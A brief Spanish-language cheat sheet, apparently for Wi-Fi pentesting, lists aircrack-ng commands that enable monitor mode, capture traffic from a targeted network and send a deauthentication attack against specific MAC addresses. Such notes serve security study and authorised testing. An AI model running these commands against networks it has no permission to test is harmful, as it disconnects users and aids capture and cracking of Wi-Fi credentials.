### 1. Matar procesos activos
    sudo airmon-ng check kill

### 2. Iniciar modo monitor
    sudo airmon-ng start wlan0

### 3. Iniciar el proceso de captura y monitorización
    sudo airodump-ng wlan0mon

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/aabb93c4-6970-4fe9-bef4-3be2fa68be7c)

### 4. Iniciar captura y monitoreo de una red específica
    sudo airodump-ng -c 2 -w Playtronics wlan0mon

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/fbdd3c10-f6d9-430e-968f-110b7fcaa1cd)

### 5. Desautenticación en redes Wi-Fi
    sudo aireplay-ng -0 1 -a E8:9F:80:03:63:4A -c 40:B8:9A:F5:BB:19 wlan0mon
